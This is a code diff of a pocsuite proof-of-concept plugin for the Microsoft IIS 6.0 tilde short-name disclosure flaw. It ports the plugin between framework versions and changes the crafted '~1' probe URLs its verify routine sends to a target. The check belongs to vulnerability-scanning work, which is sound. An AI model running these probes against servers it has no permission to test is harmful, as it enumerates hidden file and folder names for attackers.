@@ -1,10 +1,9 @@
 #!/usr/bin/env python
 # coding: utf-8
-from urllib.parse import urlparse
-from pocsuite3.api import requests as req
-from pocsuite3.api import register_poc
-from pocsuite3.api import Output, POCBase
-from pocsuite3.api import POC_CATEGORY, VUL_TYPE
+import urlparse
+from pocsuite.api.request import req
+from pocsuite.api.poc import register
+from pocsuite.api.poc import Output, POCBase
 
 
 class TestPOC(POCBase):
@@ -19,8 +18,7 @@ class TestPOC(POCBase):
     appPowerLink = 'https://support.detectify.com/customer/portal/articles/1711520-microsoft-iis-tilde-vulnerability'
     appName = 'IIS'
     appVersion = '6.0'
-    vulType = VUL_TYPE.INFORMATION_DISCLOSURE
-    category = POC_CATEGORY.EXPLOITS.REMOTE
+    vulType = 'Information Disclosure'
     desc = '''
     Microsoft IIS contains a flaw that may lead to an unauthorized information disclosure.
     The issue is triggered during the parsing of a request that contains a tilde character (~).
@@ -30,8 +28,8 @@ class TestPOC(POCBase):
     def _verify(self):
         # reference from https://github.com/lijiejie/IIS_shortname_Scanner/blob/master/iis_shortname_Scan.py
         def check(url):
-            url1 = url + '/*~1*/index99.aspx'         # an existed file/folder
-            url2 = url + '/1ndex*~1*/index99.aspx'    # not existed file/folder
+            url1 = url + '/*~1*/a.aspx'         # an existed file/folder
+            url2 = url + '/l1j1e*~1*/a.aspx'    # not existed file/folder
             # for _method in ['GET', 'OPTIONS']:
             try:
                 # GET:
@@ -50,11 +48,10 @@ class TestPOC(POCBase):
                     return True
                 return False
             except Exception as e:
-                # raise
                 return False
 
         result = {}
-        pr = urlparse(self.url)
+        pr = urlparse.urlparse(self.url)
         if pr.port:  # and pr.port not in ports:
             ports = [pr.port]
         else:
@@ -85,4 +82,4 @@ class TestPOC(POCBase):
         return output
 
 
-register_poc(TestPOC)
+register(TestPOC)
